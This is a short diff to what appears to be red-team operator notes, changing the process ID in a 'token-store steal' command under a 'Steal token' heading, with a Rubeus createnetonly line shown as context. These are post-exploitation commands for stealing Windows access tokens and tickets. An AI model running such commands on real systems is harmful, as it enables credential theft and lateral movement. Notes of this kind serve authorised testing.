@@ -32,7 +32,7 @@ execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /pr
 
 Steal token
 ```powershell
-token-store steal 5248
+token-store steal 3184
 token-store use 0 
 ```
 
